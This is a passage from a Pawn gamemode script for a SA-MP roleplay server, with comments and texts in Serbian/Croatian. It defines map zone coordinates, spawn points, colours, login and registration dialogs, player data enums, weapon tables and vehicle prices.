    {"Roca Escalante",                {2536.40,2202.70,-89.00,2625.10,2442.50,110.90}},
    {"Rockshore East",                {2537.30,676.50,-89.00,2902.30,943.20,110.90}},
    {"Rockshore West",                {1997.20,596.30,-89.00,2377.30,823.20,110.90}},
    {"Rockshore West",                {2377.30,596.30,-89.00,2537.30,788.80,110.90}},
    {"Rodeo",                        {72.60,-1684.60,-89.00,225.10,-1544.10,110.90}},
    {"Rodeo",                        {72.60,-1544.10,-89.00,225.10,-1404.90,110.90}},
    {"Rodeo",                        {225.10,-1684.60,-89.00,312.80,-1501.90,110.90}},
    {"Rodeo",                        {225.10,-1501.90,-89.00,334.50,-1369.60,110.90}},
    {"Rodeo",                        {334.50,-1501.90,-89.00,422.60,-1406.00,110.90}},
    {"Rodeo",                        {312.80,-1684.60,-89.00,422.60,-1501.90,110.90}},
    {"Rodeo",                        {422.60,-1684.60,-89.00,558.00,-1570.20,110.90}},
    {"Rodeo",                        {558.00,-1684.60,-89.00,647.50,-1384.90,110.90}},
    {"Rodeo",                        {466.20,-1570.20,-89.00,558.00,-1385.00,110.90}},
    {"Rodeo",                        {422.60,-1570.20,-89.00,466.20,-1406.00,110.90}},
    {"Rodeo",                        {466.20,-1385.00,-89.00,647.50,-1235.00,110.90}},
    {"Rodeo",                        {334.50,-1406.00,-89.00,466.20,-1292.00,110.90}},
    {"Royal Casino",                {2087.30,1383.20,-89.00,2437.30,1543.20,110.90}},
    {"San Andreas Sound",            {2450.30,385.50,-100.00,2759.20,562.30,200.00}},
    {"Santa Flora",                    {-2741.00,458.40,-7.60,-2533.00,793.40,200.00}},
    {"Santa Maria Beach",            {342.60,-2173.20,-89.00,647.70,-1684.60,110.90}},
    {"Santa Maria Beach",            {72.60,-2173.20,-89.00,342.60,-1684.60,110.90}},
    {"Shady Cabin",                    {-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00}},
    {"Shady Creeks",                {-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00}},
    {"Shady Creeks",                {-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00}},
    {"Sobell Rail Yards",            {2749.90,1548.90,-89.00,2923.30,1937.20,110.90}},
    {"Spinybed",                    {2121.40,2663.10,-89.00,2498.20,2861.50,110.90}},
    {"Starfish Casino",                {2437.30,1783.20,-89.00,2685.10,2012.10,110.90}},
    {"Starfish Casino",                {2437.30,1858.10,-39.00,2495.00,1970.80,60.90}},
    {"Starfish Casino",                {2162.30,1883.20,-89.00,2437.30,2012.10,110.90}},
    {"Temple",                        {1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90}},
    {"Temple",                        {1252.30,-1026.30,-89.00,1391.00,-926.90,110.90}},
    {"Temple",                        {1252.30,-926.90,-89.00,1357.00,-910.10,110.90}},
    {"Temple",                        {952.60,-1130.80,-89.00,1096.40,-937.10,110.90}},
    {"Temple",                        {1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90}},
    {"Temple",                        {1096.40,-1026.30,-89.00,1252.30,-910.10,110.90}},
    {"The Camels Toe",                {2087.30,1203.20,-89.00,2640.40,1383.20,110.90}},
    {"The Clowns Pocket",            {2162.30,1783.20,-89.00,2437.30,1883.20,110.90}},
    {"The Emerald Isle",            {2011.90,2202.70,-89.00,2237.40,2508.20,110.90}},
    {"The Farm",                    {-1209.60,-1317.10,114.90,-908.10,-787.30,251.90}},
    {"Four Dragons Casino",            {1817.30,863.20,-89.00,2027.30,1083.20,110.90}},
    {"The High Roller",                {1817.30,1283.20,-89.00,2027.30,1469.20,110.90}},
    {"The Mako Span",                {1664.60,401.70,0.00,1785.10,567.20,200.00}},
    {"The Panopticon",                {-947.90,-304.30,-1.10,-319.60,327.00,200.00}},
    {"The Pink Swan",                {1817.30,1083.20,-89.00,2027.30,1283.20,110.90}},
    {"The Sherman Dam",                {-968.70,1929.40,-3.00,-481.10,2155.20,200.00}},
    {"The Strip",                    {2027.40,863.20,-89.00,2087.30,1703.20,110.90}},
    {"The Strip",                    {2106.70,1863.20,-89.00,2162.30,2202.70,110.90}},
    {"The Strip",                    {2027.40,1783.20,-89.00,2162.30,1863.20,110.90}},
    {"The Strip",                    {2027.40,1703.20,-89.00,2137.40,1783.20,110.90}},
    {"The Visage",                    {1817.30,1863.20,-89.00,2106.70,2011.80,110.90}},
    {"The Visage",                    {1817.30,1703.20,-89.00,2027.40,1863.20,110.90}},
    {"Unity Station",                {1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50}},
    {"Valle Ocultado",                {-936.60,2611.40,2.00,-715.90,2847.90,200.00}},
    {"Verdant Bluffs",                {930.20,-2488.40,-89.00,1249.60,-2006.70,110.90}},
    {"Verdant Bluffs",                {1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90}},
    {"Verdant Bluffs",                {1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90}},
    {"Verdant Meadows",                {37.00,2337.10,-3.00,435.90,2677.90,200.00}},
    {"Verona Beach",                {647.70,-2173.20,-89.00,930.20,-1804.20,110.90}},
    {"Verona Beach",                {930.20,-2006.70,-89.00,1073.20,-1804.20,110.90}},
    {"Verona Beach",                {851.40,-1804.20,-89.00,1046.10,-1577.50,110.90}},
    {"Verona Beach",                {1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90}},
    {"Verona Beach",                {1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90}},
    {"Vinewood",                    {787.40,-1310.20,-89.00,952.60,-1130.80,110.90}},
    {"Vinewood",                    {787.40,-1130.80,-89.00,952.60,-954.60,110.90}},
    {"Vinewood",                    {647.50,-1227.20,-89.00,787.40,-1118.20,110.90}},
    {"Vinewood",                    {647.70,-1416.20,-89.00,787.40,-1227.20,110.90}},
    {"Whitewood Estates",            {883.30,1726.20,-89.00,1098.30,2507.20,110.90}},
    {"Whitewood Estates",            {1098.30,1726.20,-89.00,1197.30,2243.20,110.90}},
    {"Willowfield",                    {1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90}},
    {"Willowfield",                    {2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90}},
    {"Willowfield",                    {2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90}},
    {"Willowfield",                    {2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90}},
    {"Willowfield",                    {2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90}},
    {"Willowfield",                    {2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90}},
    {"Willowfield",                    {2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90}},
    {"Yellow Bell Station",            {1377.40,2600.40,-21.90,1492.40,2687.30,78.00}},
    {"Los Santos",                    {44.60,-2892.90,-242.90,2997.00,-768.00,900.00}},
    {"Las Venturas",                {869.40,596.30,-242.90,2997.00,2993.80,900.00}},
    {"Bone County",                    {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
    {"Tierra Robada",                {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
    {"Tierra Robada",                {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
    {"San Fierro",                    {-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00}},
    {"Red County",                    {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
    {"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
    {"Whetstone",                    {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}},
    {"San Andreas",                    {-99999.99,-99999.99,-99999.99,99999.99,99999.99,99999.99}}
};

//------------------------------------------------------------------------------

static const Float:RandomRudnik[][] =
{
    { 607.8982,820.8604,-42.9534 },
    { 630.2184,827.3650,-42.9609 },
    { 660.3903,835.1295,-42.9609 },
    { 680.2279,865.2991,-41.7659 },
    { 670.8752,902.7477,-40.3984 },
    { 644.1487,925.5018,-40.0650 },
    { 602.9019,921.1843,-41.9894 },
    { 554.7830,916.4139,-41.9775 },
    { 545.0648,870.7017,-41.7715 },
    { 549.8553,844.3304,-41.5359 },
    { 577.0397,846.4991,-42.2665 },
    { 607.4992,848.0822,-43.1550 },
    { 620.4105,877.4790,-42.9534 },
    { 595.6094,884.5705,-44.1377 },
    { 575.1874,875.5154,-43.7750 }
};

static const Float:RandomDMPos[][] = 
{
    { -392.0294,2273.3096,41.6269 },
    { -372.3723,2190.1331,42.3569 },
    { -349.6780,2211.5061,42.4844 },
    { -421.5497,2253.8516,42.4297 },
    { -412.5923,2209.6233,42.4297 },
    { -364.4481,2256.6392,42.4844 },
    { -376.4225,2234.5234,42.4844 },
    { -391.6523,2219.3926,42.4297 }
};

static const Float:RandomZatvor[ 24 ][ 3 ] = {

    {224.1516,1661.3735,-99.2422},
	{225.0366,1658.6449,-99.2422},
	{228.6373,1661.3066,-99.2422},
	{231.4529,1658.5099,-99.2422},
	{237.9551,1660.8579,-99.2422},
	{234.4194,1659.6389,-99.2422},
	{234.0199,1646.4996,-99.2422},
	{236.2969,1644.8694,-99.2422},
	{228.0589,1647.0010,-99.2422},
	{231.5324,1647.1575,-99.2422},
	{221.3022,1645.7224,-99.2422},
	{224.5353,1644.6453,-99.2422},
	{237.2305,1646.0698,-95.7274},
	{234.4618,1646.7599,-95.7274},
	{231.9982,1646.8641,-95.7274},
	{228.6950,1644.8474,-95.7274},
	{225.0787,1645.1726,-95.7274},
	{221.3358,1646.8582,-95.7274},
	{235.3172,1663.8577,-95.7274},
	{235.8625,1659.8965,-95.7274},
	{232.0487,1658.8674,-95.7274},
	{232.0792,1663.9609,-95.7274},
	{225.2987,1660.8881,-95.7274},
	{222.6850,1664.7867,-95.7274}
};

static const Float:SpawnAerodrom[6][3] = 
{
	{1579.1288,-2322.0776,13.3828}, // spawn-1
	{1581.9958,-2321.8408,13.3828}, // spawn-2
	{1605.4609,-2321.9185,13.4014}, // spawn-3
	{1607.6534,-2321.5239,13.4014}, // spawn-4
	{1629.6564,-2321.5027,13.4014}, // spawn-5
	{1634.2694,-2321.5210,13.4014} // spawn-6
};

static const Float:MehanicarRandom[ 17 ][ 4 ] =
{
    { 1094.8892,-1857.8705,13.1292,89.6150 },
	{ 191.7294,-1596.4749,13.9086,37.8250 },
	{ 803.1064,-1351.7421,13.1695,179.9187 },
	{ 848.0912,-1624.4163,13.1933,89.2304 },
	{ 1065.1581,-1307.2095,13.0466,359.1495 },
	{ 1317.3730,-1152.9432,23.3205,270.3507 },
	{ 1040.9744,-775.0814,104.3198,103.0993 },
	{ 1570.3113,-1118.8184,23.1655,187.9322 },
	{ 1951.0256,-1093.5686,24.9333,262.1025 },
	{ 2362.2380,-1078.4707,53.0948,284.5099 },
	{ 2308.9434,-1253.8876,23.5763,179.2797 },
	{ 2588.9773,-1449.9100,34.0345,269.4771 },
	{ 2882.4771,-1693.4589,10.7519,168.8677 },
	{ 2854.2764,-1957.2263,10.6449,180.0496 },
	{ 2151.8186,-2332.4666,13.1085,52.8114 },
	{ 2097.4441,-2161.8250,13.2564,89.2744 },
	{ 1381.5957,-1565.3755,13.2683,165.0116 }
};

//

static const Float:RandomWARMapa11[ 9 ][ 3 ] =
{
	{1147.9226,2813.0664,10.8125},
	{1148.4319,2809.7048,10.8203},
	{1148.7649,2805.6304,10.8203},
	{1151.0385,2800.8855,10.8203},
	{1155.1233,2800.9697,10.8203},
	{1155.0419,2805.0557,10.8203},
	{1144.4396,2799.8264,10.8125},
	{1139.9843,2806.2156,10.9688},
	{1140.9631,2812.3542,10.9190}
};
static const Float:RandomWARMapa12[ 9 ][ 3 ] =
{
	{1403.0447,2733.0447,10.8126},
	{1410.5400,2737.9583,10.8203},
	{1414.4192,2747.7236,10.8203},
	{1411.3033,2757.2588,11.2597},
	{1399.9032,2750.0581,10.8203},
	{1391.1559,2744.3250,10.8203},
	{1384.0992,2743.9656,10.8203},
	{1388.7274,2728.1936,10.8203},
	{1379.5826,2729.1980,10.8203}
};
static const Float:RandomWARMapa21[ 7 ][ 3 ] =
{
	{-972.6812,1096.0303,1344.9882},
	{-972.5949,1084.3115,1344.9950},
	{-973.4254,1076.6229,1344.9950},
	{-973.5809,1070.1228,1345.0007},
	{-973.7216,1064.7092,1345.0061},
	{-973.6556,1056.8405,1345.0156},
	{-973.0229,1024.2570,1345.0525}
};
static const Float:RandomWARMapa22[ 7 ][ 3 ] =
{
	{-1132.7081,1022.7668,1345.7273},
	{-1132.6602,1035.5205,1345.7427},
	{-1132.2740,1041.1238,1345.7412},
	{-1131.0614,1048.8101,1345.7435},
	{-1132.0385,1055.2090,1345.7603},
	{-1132.0372,1063.7393,1345.7628},
	{-1131.6272,1094.3673,1345.7885}
};
static const Float:RandomWARMapa31[ 4 ][ 3 ] =
{
	{1295.8276,1070.7544,10.7652},
	{1293.9846,1078.9841,10.6999},
	{1300.7595,1085.3835,10.8203},
	{1312.7617,1084.8655,10.8203}
};
static const Float:RandomWARMapa32[ 4 ][ 3 ] =
{
	{1492.2148,916.9006,10.9297},
	{1478.9260,916.6356,10.8203},
	{1467.7583,915.6778,10.8203},
	{1471.7261,930.1809,10.8203}
};
static const Float:RandomWARMapa41[ 5 ][ 3 ] =
{
	{2922.0735,4057.7339,41.9413},
	{2924.9233,4058.4211,41.9413},
	{2925.6855,4053.5361,41.9413},
	{2926.5029,4045.3936,41.9413},
	{2921.1628,4044.2600,41.9413}
};
static const Float:RandomWARMapa42[ 5 ][ 3 ] =
{
	{2925.1416,4300.6401,41.9413},
	{2923.4927,4307.6055,41.9413},
	{2927.1511,4311.6382,41.9413},
	{2930.3958,4310.5850,41.9413},
	{2931.5002,4302.3281,41.9413}
};
static const Float:RandomWARMapa51[ 4 ][ 3 ] =
{
	{-136.6962,-114.7337,3.1172},
	{-126.6221,-115.4705,3.1172},
	{-104.1388,-119.4517,3.1172},
	{-84.2369,-121.1719,3.1172}
};
static const Float:RandomWARMapa52[ 4 ][ 3 ] =
{
	{0.4129,91.1095,3.1172},
	{-22.3045,108.2041,3.1172},
	{-45.0152,113.6356,3.1172},
	{-77.4174,134.2272,3.1172}
};

//================================[ Boje ]====================================//

#define CRVENA                                                        0xFA5555FF
#define ZELENA                                                     	  0x33AA33FF
#define PLAVA                                                         0xA9C4E4FF
#define SIVA                                                          0xAFAFAFFF
#define ZUTA                                                          0xFFFF00FF
#define GAMEMASTER 													  0x48E86BFF
#define ANTICHEAT 													  0xDC143CFF
#define ADM_WARN                                                      0xC43500FF//0xDABB3EAA

//===============================[ Strings ]==================================//

static const DialogTekstovi[6][] =
{
	"{4282C0}> {FFFFFF}Upisite vasu lozinku kako bi se ulogovali.\n\
	{4282C0}> {FFFFFF}Imate {4282C0}(60) {FFFFFF}sekundi da upisete lozinku.\n\
	{4282C0}> {FFFFFF}Imate {4282C0}(%d) {FFFFFF}pokusaja ili kick.",

	//--------------------------------------------------------------------------

	"{FFFFFF}Hvala Vam na registraciji, ako su vam neke stvari nisu jasne, mozete\n\
 	pitati Staff ili suigraca za pomoc. Ako bi slucajno nasli gresku u\n\
 	skripti, molimo Vas da ju istog trenutka prijavite bilo kojem clanu Ultimate Team-a.\n\
 	Ukoliko iskoristavate neku gresku biti cete kaznjeni najvecom mogucom kaznom.\n\
 	Zelimo Vam puno srece u daljnjem igranju, ne zaboravite na pravila i ugodno\n\
 	se zabavite!\n\n\t\t\t\t\t\t\t- Ultimate Staff Team",

 	//--------------------------------------------------------------------------

	"{FFFFFF}Dobrodosao na {4282C0}'ULTIMATE - RPG' {FFFFFF}server.\n\
	Ukoliko su ti neke stvari nejasne obrati se {4282C0}Administratorima.\n\
	{FFFFFF}To mozes uraditi jednostavno, preko komande {4282C0}[ /report ].\n\
	{FFFFFF}Zelimo vam puno srece i zabave u daljoj igri i boravku na nasem serveru.\n\
	I {4282C0}ne zaboravite postovati pravila {FFFFFF}naseg servera.",

	//--------------------------------------------------------------------------

	"{FFFFFF}Kaznjeni ste.\n\n\
	Razlog kaznjavanja: {4282C0}%s\n\
	{FFFFFF}Kaznjeni ste:\n\
	{4282C0}- {FFFFFF}Oduzimanjem {4282C0}$%d\n\
	{4282C0}- {FFFFFF}Zatvorom od {4282C0}%d {FFFFFF}minuta.\n\
	{4282C0}- {FFFFFF}Upozorenjem {4282C0}+%d\n\n\
	Ukoliko mislite da je vase kaznjavanje pogresno, obratite nam se na forumu.\n\
	Sekcija na forumu -> {4282C0}UnPunishment {CCCCCC}(OBAVEZNO JAVLJANJE SA SLIKOM KAZNE).\n\n\n\
	\t\t\t\t\t\t\t\t{4282C0}> Ultimate Staff Team",

	//--------------------------------------------------------------------------

	"{FFFFFF}Informacije o vasem karakteru:\n\n\
    {4282C0}> Ime i prezime: {FFFFFF}%s\n\
	{4282C0}> Lozinka: {FFFFFF}%s\n\
	{4282C0}> Mail: {FFFFFF}%s\n\
	{4282C0}> Godine: {FFFFFF}%d\n\
	{4282C0}> Pol: {FFFFFF}%s\n\
	{4282C0}> Poreklo: {FFFFFF}%s\n\n\
	Ukoliko su ovi podatci tacni i sigurni ste da zelite da nastavite registraciju\n\
	stisnite na polje {4282C0}'DA'.",

	"{FFFFFF}* U prazan prostor unesite vasu email adresu za vracanje passworda:"
};
new sDStrg[512];

//=================================[ Enum ]===================================//

new accountRealPass[ MAX_PLAYERS ][ 64 ];

//

const MAX_VEH_SLOT = 20;

enum player_veh_data
{
	vehicle_id[ MAX_VEH_SLOT ]
}
new player_veh[ MAX_PLAYERS ][ player_veh_data ];

enum xPlayerInfo
{
	xID,  // done sql
	xLozinka[255], // done sql
	xRegistrovan, //done sql
	xMail[50],  // done sql
	xPol,  // done sql
	xGodine,  // done sql
	xNovac,  // done sql
	xLevel, // done sql
	xRespekt, // done sql
	xPoboljsanja, // done sql
	xPayDay, // done sql
	xAdmin, // done sql
	xSkin, // done sql
	xSpawn, // done sql
	xLider, // done sql
	xClan, // done sql
	xRank, // done sql
	xMaterijali, // done sql
	xBussinesSqlID, // done sql
	xFirmaID, //////////////// no sql
	xPosao,// done sql
	xCigare, ////////////// edit ne u bazi
	xUpaljac, ////////////// edit ne u bazi
	xBStil, // done sql
	Float:xSHealth, // done sql
	xBrojTelefona, // done sql
	xVozacka, // done sql
	xBrodska, // done sql
	xLetelica, // done sql
    xGunLicense, // done sql
    xToolkit, // done sql
    xPropertySqlID[ 3 ], // done sql
    xProperty[ 3 ], ///////// no sql
    xTelefonBon, // done sql
    xTelefon, // done sql
    xSnaga, // done sql
    xZatvor, // done sql
    xZatvorVreme, // done sql
    xWanted, // done sql
    xUhapsen, // done sql
    xPDUhapsio, // done sql
    xPDStatsTicket, // done sql
	xPDStatsTicketMoney, // done sql
	xTakenWeps, // done sql
    xTakenDrugs, // done sql
    xAKod, // done sql
    xSat, // done sql
    xBRacun, // done sql
    xPreostaloZaOtplatu, // done sql
    xIznosRate, // done sql
    xIznosKredita, // done sql
    xOnlineSati, // done sql
    xGamemaster, // done sql
    xWarn, // done sql
    xMute, // done sql
    Float:xMarker[ 3 ], // done sql
    xOrgUgovor, // done sql
	xGpsLevel, // done sql
	xSkriptaRank, // done sql
	xDrzava, // done sql
	xVIPLevel, // done sql
	xPromoter, // done sql
	xYouTuber, // done sql
	xHitmenCena, // done sql
	xKazneniUgovor, // done sql
	xOffPJail[ 64 ], // done sql
	xOffPPrison[ 64 ], // done sql
	xOffPMute[ 64 ], // done sql
	xStaffMin,// done sql
	xRegDate[ 64 ], // done sql
	xMarried, // done sql
	xMarriedTo[ 24 ], // done sql
	xSpecAdmin, // done sql
	xBingoNumber, // done sql
	xBingoMoney, // done sql
	xSlotoviVozila, // done sql
	xPljackaVreme, // done sql
	xLeaveJail, // done sql
	xHangarTime, // done sql
	xEvent1Mesto, // done sql
	xEvent2Mesto, // done sql
	xEvent3Mesto, // done sql
	xDMEventUbistva, // done sql
	xCSTDMScore, // done sql
	xRentID, // done sql
	xZlato, // done sql
	xDiamond,
	xRezervniKljucevi, // done sql
	xDBO, // done sql
	xDBoja, // done sql
	xReactionPoen, // done sql
    xUPoen, // done sql
    xTiki, // done sql
	Float:xVipTime, // done sql
	xZauzimanjeVreme, // done sql
	xPoklon, // done sql
	xPaketic, // done sql
	xKljucKapije[ MAX_PLAYER_NAME ], // done sql
	xSvercer, // done sql
	xRobVreme, // done sql
	xAGMStats, // done sql
    bool:xBoombox, // done sql
    xTorba_Pizza, // done sql
    xTorba_Sok, // done sql
    xTorba_Pivo, // done sql
    xTorba_Hambi, // done sql
    xTorba_Riba, // done sql
    bool:xTorba_Laptop, // done sql
    xTorba_Droga, // done sql
    xTorba_Oruzje[3], // done sql
    xTorba_OruzjeM[3], // done sql
    xTDColor,
    xFirework,
    xAktivnaIgra,
    xBonPotvrda,
    xPaysPotvrda,
    xVIPWarn,
    xOglasWarn,
    bool:xTogLabel,
	//
	xDeathLastMSG,
    xDeathTime,
    Float:xDeathPos[3],
	xPoslaoNPoruku, //ovo se ne cuva
	xPoslaoLPoruku, //ovo se ne cuva
	xUbijen, //ovo se ne cuva
	xSpawned //ovo se ne cuva
}
new PlayerInfo[ MAX_PLAYERS ][ xPlayerInfo ],
	CountStatistic;

enum clothes_data
{
	x_slot_1_model,
	Float:x_slot_1_pos[9],

	x_slot_2_model,
	Float:x_slot_2_pos[9],

	x_slot_3_model,
	Float:x_slot_3_pos[9],

	x_slot_4_model,
	Float:x_slot_4_pos[9],
}
new clothes_info[ MAX_PLAYERS ][ clothes_data ];

/* __________________________________________________________________________ */
/* __________________________________________________________________________ */

static const g_aWeaponSlots[] = {
	0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 10, 10, 10, 10, 10, 10, 8, 8, 8, 0, 0, 0, 2, 2, 2, 3, 3, 3, 4, 4, 5, 5, 4, 6, 6, 7, 7, 7, 7, 8, 12, 9, 9, 9, 11, 11, 11
};

enum _weaponInfos{
	wName[24],
	wID,
	wSlot,
	wModel
}

new WeaponInfos[ 47 ][ _weaponInfos ] = {
	{"No gun", 0, 0, 0 },
	{"Brass Knuckles", 1, 0, 331 },
	{"Golf Club", 2, 1, 333 },
	{"Nightstick", 3, 1, 334 },
	{"Knife", 4, 1, 335 },
	{"Baseball Bat", 5, 1, 336 },
	{"Shovel", 6, 1, 337 },
	{"Pool Cue", 7, 1, 338 },
	{"Katana", 8, 1, 339 },
	{"Chainsaw", 9, 1, 341 },
	{"Double-ended Dildo", 10, 10, 321 },
	{"Dildo", 11, 10, 321 },
	{"Vibrator", 12, 10, 323 },
	{"Silver Vibrator", 13, 10, 324 },
	{"Flowers", 14, 10, 325 },
	{"Cane", 15, 10, 326 },
	{"Grenade", 16, 8, 342 },
	{"Tear Gas", 17, 8, 343 },
	{"Molotov Cocktail", 18, 8, 344 },
	{"No gun", 19, -1, 0 },
	{"No gun", 20, -1, 0 },
	{"No gun", 21, -1, 0 },
	{"Colt .45", 22, 2, 346 },
	{"Silenced Colt .45", 23, 2, 347 },
	{"Desert Eagle", 24, 2, 348 },
	{"Shotgun", 25, 3, 349 },
	{"Sawnoff Shotgun", 26, 3, 350 },
	{"Combat Shotgun", 27, 3, 351 },
	{"Micro SMG", 28, 4, 352 },
	{"MP5", 29, 4, 353 },
	{"AK47", 30, 5, 355 },
	{"M16", 31, 5, 356 },
	{"Tec-9", 32, 4, 372 },
	{"Country Rifle", 33, 6, 357 },
	{"Sniper Rifle", 34, 6, 358 },
	{"RPG", 35, 7, 359 },
	{"HS Rocket", 36, 7, 0 },
	{"Flamethrower", 37, 7, 361 },
	{"Minigun", 38, 7, 362 },
	{"Satchel Charge", 39, 8, 363 },
	{"Detonator", 40, 12, 364 },
	{"Spraycan", 41, 9, 365 },
	{"Fire Extinguisher", 42, 9, 366 },
	{"Camera", 43, 9, 367 },
	{"Night Vis Goggles", 44, 11, 368 },
	{"Thermal Goggles", 45, 11, 369 },
	{"Parachute", 46, 11, 371 }
};

/* __________________________________________________________________________ */

#define IsValidWeapon(%0) (%0>=1 && %0<=18 || %0>=21 && %0<=46)
const MAX_W_SLOTS = 13;

/* __________________________________________________________________________ */

enum antiC
{
	SpamChat,
	SpamCommand,
	bool:SpamBanka,
    //
	AFKMinute,
	Float:AFKFirstPos[ 3 ],
	Float:AFKSecondPos[ 3 ]
}
new antiCheatCS[ MAX_PLAYERS ][ antiC ];

new Float:RealVehiclePositions[ MAX_VEHICLES ][ 3 ],
		  LastPullingVehicle[ MAX_VEHICLES ];

/* __________________________________________________________________________ */

const MaxBrojKreiranih = MAX_VEHICLES-20;

enum Serva
{
	// save
	RegistrovanihKorisnika,
	BanovanihKorisnika,
	KikovanihKorisnika,
	BrojWarnova,
	BrojPosetaServeru,
	HappyHours,
	HappyHoursLvl,
	HappyJobs,
	PocetniLevel,
	PocetniNovaca,
	bool:KupovinaVozila,
	bool:Report,
	bool:Pitanja,
	bool:Oglasi,
	RekordServera,
	BankaNovac,
	bool:Registracija,
	ReactTime,
	ReactName[ MAX_PLAYER_NAME ],

	// dont save
	Text3D:BankaNovacLabel,
	HangarPaket,
	Text3D:SHangarLabel,
	SkladisteDroga,
	Text3D:SDrogaLabel,
	BrojImovina,
	BrojKontejnera,
	BrojKreiranihVozila,
	Prognozasys,
	VremeInGame,
	bool:RRVehicle,
	bool:PaketNijeNaSvomMestu,
	bool:PaketPoceo,
	PaketID,
	PaketTimer,
	PaketObject,
	PaketVreme,
	PaketStvari[ 2 ],
	TClearChat
}
new ServerInfo[ Serva ];

/* __________________________________________________________________________ */

enum rInfo
{
    Float:sX,
    Float:sY,
    Float:sZ,
    sObject,
    sSpike
};
new Roadblocks[ 100 ][ rInfo ],
	EditRoadblock[MAX_PLAYERS],
	Iterator:iter_Roadblock<100>;

/* __________________________________________________________________________ */

enum BoomboxInfao
{
	boomboxPlaced,
	Float:boomboxPos[ 3 ],
	boomboxInterior,
	boomboxWorld,
	boomboxObject,
	boomboxURL[128 char],
	Text3D:boomboxText3D
};
new BoomboxInfo[ MAX_PLAYERS ][ BoomboxInfao ];
new Boombox[ MAX_PLAYERS ];

/* __________________________________________________________________________ */

enum rudarBre
{
	rudarTimer
};
new rudarPosao[ MAX_PLAYERS ][ rudarBre ];

/* __________________________________________________________________________ */

const MAX_TIME = 23;

new PlayerCP[ MAX_PLAYERS ],
	PlayerEventVehID[ MAX_PLAYERS ],
	PlayerInvited[ MAX_PLAYERS ],
	Float:PlayerPos[ MAX_PLAYERS ][ 3 ],
	PlayerPosInt[ MAX_PLAYERS ],
	PlayerPosVW[ MAX_PLAYERS ];

enum 
{
	event_STUNT = 1,
	event_JETPACK,
	event_DRAG,
	event_TEMPLERUN,
	event_LIVE
};

enum jao 
{
	Drivers,
	Position,
	Vehicle[ 20 ],
	Started,
	EventTime
}
new EventInfo[ jao ];

new Float:eventliveX, 
	Float:eventliveY, 
	Float:eventliveZ, 
	Float:eventliveA;

/* __________________________________________________________________________ */
/* __________________________________________________________________________ */

enum zlInfo
{
	zPocinio[ MAX_PLAYER_NAME ],
	zPrijavio[ MAX_PLAYER_NAME ],
	zZlocin[ 32 ],
};
new ZlocinInfo[ MAX_PLAYERS ][ zlInfo ];

//--

new ZlataraSef, 
	bankSafe;

/* __________________________________________________________________________ */
/* __________________________________________________________________________ */

new hitfound = 0;
new ahitid = 999;

enum HitmanInfoa
{
	GotHit,
	GetChased,
	GoChase,
	PlacedNews
};
new HitmanInfo[ MAX_PLAYERS ][ HitmanInfoa ];

new LastCar[ MAX_PLAYERS ];

const MAX_INTERIJERA = 10;
enum interior_data
{
	int_Name[32],
	Float:int_Enter[ 4 ],
	Float:int_Exit[ 4 ],
	int_IntExit,
	int_IntEnter,
	int_VwExit,
	int_VwEnter
};
new interior_info[ MAX_INTERIJERA ][ interior_data ];

new VehPrice[ 212 ][ 3 ] =
{
	{ 400, 300000, 1500 }, // Landstalker
	{ 401, 180000, 900 }, // Bravura
	{ 402, 700000, 2150 }, // Buffalo
	{ 403, 0, 0 }, // Linerunner
	{ 404, 110000, 550 }, // Perenniel
	{ 405, 160000, 800 }, // Sentinel
	{ 406, 0, 0 }, // Dumper edit
	{ 407, 0, 0 }, // Firetruck edit
	{ 408, 0, 0 }, // Trashmaster edit
	{ 409, 700000, 3500 }, // Stretch
	{ 410, 145000, 725 }, // Manana
	{ 411, 1700000, 4500 }, // Infernus
	{ 412, 120000, 600 }, // Voodoo
	{ 413, 210000, 1050 }, // Pony
	{ 414, 0, 0 }, // Mule
	{ 415, 1200000, 3500 }, // Cheetah
	{ 416, 0, 0 }, // Ambulance
	{ 417, 500000, 2500 }, // Leviathan
	{ 418, 230000, 1150 }, // Moonbeam
	{ 419, 120000, 600 }, // Esperanto
	{ 420, 0, 0 }, // Taxi
	{ 421, 225000, 1125 }, // Washington
	{ 422, 170000, 850 }, // Bobcat
	{ 423, 0, 0 }, // Mr Whoopee edit
	{ 424, 520000, 2600 }, // BF Injection edit
	{ 425, 0, 0 }, // Hunter edit
	{ 426, 320000, 1600 }, // Premier
	{ 427, 0, 0 }, // Enforcer edit
	{ 428, 0, 0 }, // Securicar edit
	{ 429, 1000000, 3750 }, // Banshee
	{ 430, 0, 0 }, // Predator edit
	{ 431, 0, 0 }, // Bus edit
	{ 432, 0, 0 }, // Rhino edit
	{ 433, 0, 0 }, // Barracks
	{ 434, 290000, 1450 }, // Hotknife
	{ 435, 0, 0 }, // Article Trailer edit
	{ 436, 110000, 550 }, // Previon edit
	{ 437, 0, 0 }, // Coach edit
	{ 438, 0, 0 }, // Cabbie
	{ 439, 270000, 1350 }, // Stallion
	{ 440, 0, 0 }, // Rumpo
	{ 441, 0, 0 }, // RC Bandit edit
	{ 442, 0, 0 }, // Romero
	{ 443, 0, 0 }, // Packer
	{ 444, 0, 0 }, // Monster edit
	{ 445, 310000, 1550 }, // Admiral
	{ 446, 600000, 3000 }, // Squallo edit
	{ 447, 300000, 1500 }, // Seasparrow edit
	{ 448, 0, 0 }, // Pizzaboy
